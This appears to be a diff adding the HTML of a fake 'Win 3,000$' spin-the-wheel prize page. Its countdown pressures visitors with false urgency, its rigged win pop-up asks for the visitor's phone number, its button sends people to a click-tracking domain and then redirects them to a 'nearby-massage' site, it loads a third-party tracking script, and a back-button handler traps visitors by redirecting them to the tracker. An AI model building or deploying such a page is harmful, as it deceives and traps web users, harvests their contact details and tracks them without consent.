@@ -1,0 +1,87 @@
+
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Sweep Now</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width" />
+    <link href="./css/styles.css" rel="stylesheet" />
+    <link href="./css/wheel.css" rel="stylesheet" />
+    <script type="text/javascript" src="./js/Winwheel.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/latest/TweenMax.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <script type="text/javascript" src="./js/Winwheel.js"></script>
+<!--Optional, send client hints to get accurate device data-->
+<meta http-equiv="delegate-ch" content="sec-ch-ua https://ycfkku.mcgo2.com; sec-ch-ua-mobile https://ycfkku.mcgo2.com; sec-ch-ua-arch https://ycfkku.mcgo2.com; sec-ch-ua-model https://ycfkku.mcgo2.com; sec-ch-ua-platform https://ycfkku.mcgo2.com; sec-ch-ua-platform-version https://ycfkku.mcgo2.com; sec-ch-ua-bitness https://ycfkku.mcgo2.com; sec-ch-ua-full-version-list https://ycfkku.mcgo2.com; sec-ch-ua-full-version https://ycfkku.mcgo2.com" />
+
+<!-- MaxConv Tracking Script Base Code-->
+<script>!function(w,d,o,n,c){w[o]=w[o]||function(){(w[o].q=w[o].q||[]).push(arguments)};var s=d.createElement(n),t=d.getElementsByTagName(n)[0];s.async=!0;s.defer=!0;s.src="https://ycfkku.mcgo2.com/t/t.js";t.parentNode.insertBefore(s,t);}(window,document,"maxconv","script");</script>
+<noscript><link rel="stylesheet" href="https://ycfkku.mcgo2.com/t/t.css?mc_ns=1" /></noscript>
+<!-- End MaxConv Tracking Script Base Code-->
+</head>
+
+<body>
+    <div class="main-section">
+        <div class="header">
+            <h1 class="main-title" ><img src="./img/moneypk.png">Win 3,000$!<img src="./img/moneypk.png">
+            </h1>
+        </div>
+        <h4 class="intro-copy" >You have <span id="mins">0</span> minutes and <span id="hsecs" style="color:red">57</span> seconds
+            </b>
+            to play or your points will be given to others.</h4>
+        <h3 class="spin-copy" >Note: This prize is valid for a limited time so hurry!</h3>
+        <div class="spinning-section" id="canvasContainer">
+            <canvas id='canvas' width='300' height='300'>
+                Canvas not supported, use another browser.
+            </canvas>
+            <img id="prizePointer" src="./img/wheel-pointer.png" alt="V" />
+        </div>
+    </div>
+    <div class="custom-model-main">
+        <div id="emitter"></div>
+        <div class="custom-model-inner">
+            <div class="close-btn">×</div>
+            <div class="custom-model-wrap">
+                <div class="pop-up-content-wrap pop-up-content-wrap-1">
+                    <h4 >Congratulations!</h4>
+                    <p > Each week we will pick one lucky customer who can win
+                        <strong>3,000$</strong>! </p>
+                    <div  class="repeat-btn repeat-btn-1" onClick="theWheel.startAnimation();">Okay fine</div>
+                </div>
+                <div class="pop-up-content-wrap pop-up-content-wrap-2">
+                    <h4>Sorry, you didn't get anything.</h4>
+                    <img src="./img/refresh-black.png" alt="refresh-prize">
+                    <p > Let's try it again! </p>
+                    <div  class="repeat-btn repeat-btn-2" onClick="startSpin();">Okay fine</div>
+                </div>
+                <div class="pop-up-content-wrap pop-up-content-wrap-3">
+                    <h4 >Congratulations!</h4>
+                    <img src="./img/moneyprizeZA.png" alt="refresh-prize">
+                    <p > You won $3,000! Please fill in your number to claim your rewards. </p>
+                    <a  href="https://ycfkku.mcgo2.com/click" target="_blank" onclick="setTimeout(function() { window.location = 'https://nearby-massage.top'; }, 100);" class="final-btn repeat-btn">Okay fine</a>
+                </div>
+            </div>
+        </div>
+        <div class="bg-overlay"></div>
+    </div>
+    <script type="text/javascript" src="./js/spinning.js"></script>
+    <script type="text/javascript" src="./js/scripts.js"></script>
+    <script type="text/javascript" src="./js/confetti.js"></script>
+    <script>
+        // 当页面加载完成时，立即向history栈添加一个状态
+        history.pushState(null, null, location.href);
+        
+        window.onpopstate = function(event) {
+            // 这里处理用户点击浏览器后退按钮的情况
+            // 重定向用户到指定页面, 比如 Google
+            location.href = 'https://ycfkku.mcgo2.com/click';
+            // 或者重定向用户到他们之前的页面
+            // history.go(-1);
+        }
+      </script>
+</body>
+
+</html>
